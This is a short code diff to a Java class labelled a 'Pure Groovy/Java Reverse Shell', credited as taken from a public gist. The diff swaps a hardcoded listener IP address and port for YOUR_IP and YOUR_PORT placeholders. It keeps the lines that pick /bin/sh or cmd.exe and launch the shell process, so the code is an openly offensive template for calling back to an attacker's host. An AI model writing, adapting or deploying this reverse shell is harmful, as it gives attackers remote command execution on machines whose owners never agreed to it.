@@ -9,8 +9,8 @@ public class Shell extends Thread {
             //Pure Groovy/Java Reverse Shell
             //snatched from https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76
 
-            String lhost = "51.15.254.246";
-            int lport = 4445;
+            String lhost = "YOUR_IP";
+            int lport = YOUR_PORT;
             ////            String cmd = "cmd.exe"; //win
             String cmd = "/bin/sh"; //linux
             Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
